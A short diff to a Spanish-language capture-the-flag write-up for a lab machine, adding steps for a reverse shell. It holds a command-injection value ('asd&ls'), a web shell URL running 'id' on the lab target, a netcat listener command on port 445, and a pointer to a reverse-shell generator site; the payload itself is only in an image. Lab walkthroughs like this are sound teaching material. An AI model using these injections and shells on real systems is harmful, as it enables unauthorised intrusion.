@@ -181,7 +181,7 @@ asd&ls
 
 URL-->`http://172.17.0.2/cmd.php?cmd=id`
 
-![imagen_CTF](images/Rolarola/18.png)
+![imagen_CTF](images/Rolarola/19.png)
 
 
 7- lanzamos una reverse shell:
@@ -189,6 +189,17 @@ URL-->`http://172.17.0.2/cmd.php?cmd=id`
 nos pornemos en escucha en nuestra máquina atacante por el puerto 445:
 
 ```bash
+sudo nc -nvlp 445
+```
+
+
+![imagen_CTF](images/Rolarola/20.png)
+
+
+
+creamos el payload, nos vamos a la pagina `https://www.revshells.com/` y rellenamos los datos:
+
+![imagen_CTF](images/Rolarola/21.png)
 
 
 
